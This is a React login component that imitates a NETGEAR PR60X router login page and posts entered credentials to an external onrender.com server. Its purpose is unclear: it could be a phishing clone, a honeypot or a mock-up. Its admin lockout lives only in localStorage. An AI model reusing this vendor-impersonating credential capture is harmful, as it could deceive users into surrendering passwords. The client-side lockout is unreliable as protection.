// src/App.js
import React, { useState, useRef, useEffect } from "react";
import "./App.css";
import leftImage1 from "../../assets/leftImage1.png";
import { useNavigate } from "react-router-dom";

const ADMIN_USERNAME = "admin";
const MAX_ATTEMPTS = 5;
const LOCK_TIME = 30; 

export default function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const passwordRef = useRef(null);

  const [locked, setLocked] = useState(false);
  const [remainingTime, setRemainingTime] = useState(0);


  const [errors, setErrors] = useState({ username: false, password: false });
  const [serverMsg, setServerMsg] = useState("");

  // state to trigger silent reload
  const [reloadAfterFail, setReloadAfterFail] = useState(false);

  const navigate = useNavigate();

  const failKey = (user) => `fail_${user}`;
  const lockKey = (user) => `lock_${user}`;

  
  const handleSubmit = async (e) => {
    e.preventDefault();
    setServerMsg("");
    setErrors({ username: false, password: false });
    setReloadAfterFail(false);

    if (username === ADMIN_USERNAME && locked) {
      setServerMsg(`Too many attempts. Try again in ${remainingTime}s`);
      return;
    }


    if (!username.trim() || !password) {
      setErrors({
        username: !username.trim(),
        password: !password,
      });
      return;
    }

    try {
      const res = await fetch("https://routing-13jd.onrender.com/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: username.trim(), password }),
      });

      const data = await res.json().catch(() => ({}));

      if (res.ok && data.status === true) {
          if (username === ADMIN_USERNAME) {
            localStorage.removeItem(failKey(username));
            localStorage.removeItem(lockKey(username));
          }

          if (data.token) localStorage.setItem("authToken", data.token);
          localStorage.setItem("username", username.trim());

          navigate("/dashboard");
          return;
        }


      // FAILURE
const message = data?.message || "Invalid credentials";

if (username === ADMIN_USERNAME) {
  const currentFails = Number(localStorage.getItem(failKey(username)) || 0) + 1;
  localStorage.setItem(failKey(username), currentFails);

  
  if (currentFails >= MAX_ATTEMPTS) {
    const lockUntil = Date.now() + LOCK_TIME * 1000;
    localStorage.setItem(lockKey(username), lockUntil);

    setLocked(true);
    setRemainingTime(LOCK_TIME);
    setServerMsg(`Too many attempts. Try again in ${LOCK_TIME}s`);

    return;
  }
}

// normal error handling
setServerMsg(message);
setErrors({ username: true, password: true });
setReloadAfterFail(true);

    } catch (err) {
      console.error("Network/login error:", err);
      setServerMsg("Network error — could not reach authentication server.");
      setReloadAfterFail(true);
    }
  };
  useEffect(() => {
  if (username !== ADMIN_USERNAME) return;

  const lockUntil = localStorage.getItem(lockKey(username));
  if (!lockUntil) return;

  const secondsLeft = Math.floor((lockUntil - Date.now()) / 1000);

  if (secondsLeft > 0) {
    setLocked(true);
    setRemainingTime(secondsLeft);
  } else {
    localStorage.removeItem(lockKey(username));
    localStorage.removeItem(failKey(username));
    setLocked(false);
  }
}, [username]);

useEffect(() => {
  if (!locked) return;

  const timer = setInterval(() => {
    setRemainingTime((time) => {
      if (time <= 1) {
        clearInterval(timer);

        setLocked(false);
        setServerMsg("");
        setErrors({ username: false, password: false });

        localStorage.removeItem(lockKey(ADMIN_USERNAME));
        localStorage.removeItem(failKey(ADMIN_USERNAME));

        return 0;
      }

      return time - 1;
    });
  }, 1000);

  return () => clearInterval(timer);
}, [locked]);

useEffect(() => {
  if (locked && remainingTime > 0) {
    setServerMsg(`Too many attempts. Try again in ${remainingTime}s`);
  }
}, [remainingTime, locked]);



  // EFFECT → silent reload after 10s
  useEffect(() => {
    if (!reloadAfterFail) return;

    const t = setTimeout(() => window.location.reload(), 10000);
    return () => clearTimeout(t);
  }, [reloadAfterFail]);

  // RESET reload trigger when user types again
  const onUsernameChange = (val) => {
    setUsername(val);
    setReloadAfterFail(false);
    if (errors.username) setErrors((p) => ({ ...p, username: false }));
    if (!locked && serverMsg) setServerMsg("");

  };

  const onPasswordChange = (val) => {
    setPassword(val);
    setReloadAfterFail(false);
    if (errors.password) setErrors((p) => ({ ...p, password: false }));
    if (!locked && serverMsg) setServerMsg("");

  };

  return (
    <div className="page">
      <aside className="left-panel">
        <div className="left-inner">
          <h1 className="product-title">PR60X</h1>
          <div className="divider" />
          <p className="subtitle">
            Multi-Gigabit Dual WAN Pro Router
            <br />
            with Insight Cloud Management
          </p>
          <img className="device-img" src={leftImage1} alt="router device" />
        </div>
      </aside>

      <main className="right-panel">
        <div className="logo">NETGEAR</div>

        <form className="login-form" onSubmit={handleSubmit} noValidate>
          <h2 className="login-title">Log In</h2>

          {/* Username */}
          <div className={`floating-group ${errors.username ? "input-error" : ""}`}>
            <input
              id="username"
              name="username"
              className="input-field"
              type="text"
              value={username}
              onChange={(e) => onUsernameChange(e.target.value)}
              placeholder=" "
              autoComplete="username"
              aria-label="username"
            />
            <label htmlFor="username" className="float-label">
              Username
            </label>
          </div>

          {/* Password */}
          <div className={`floating-group ${errors.password ? "input-error" : ""}`}>
            <input
              id="password"
              name="password"
              ref={passwordRef}
              className="input-field"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => onPasswordChange(e.target.value)}
              placeholder=" "
              autoComplete="current-password"
              aria-label="password"
            />
            <label htmlFor="password" className="float-label">
              Password
            </label>

            <button
              type="button"
              className="pw-toggle"
              onClick={() => {
                setShowPassword((s) => !s);
                setTimeout(() => passwordRef.current?.focus(), 0);
              }}
              aria-label={showPassword ? "Hide password" : "Show password"}
            >
              {showPassword ? (
                <img
                  src="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/icons/eye-slash.svg"
                  alt="Hide password"
                  width="20"
                  height="20"
                />
              ) : (
                <img
                  src="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/icons/eye.svg"
                  alt="Show password"
                  width="20"
                  height="20"
                />
              )}
            </button>
          </div>

          <button
            className="submit"
            type="submit"
            disabled={locked}
          >
            {locked ? "Log In🚫" : "Log In"}
          </button>



          {serverMsg && (
            <p
              className={`status-text ${
                serverMsg.includes("Too many attempts")
                  ? "lock-text"
                  : errors.username || errors.password
                  ? "error-text"
                  : ""
              }`}
            >
              {serverMsg}
            </p>
          )}

        </form>
      </main>
    </div>
  );
}
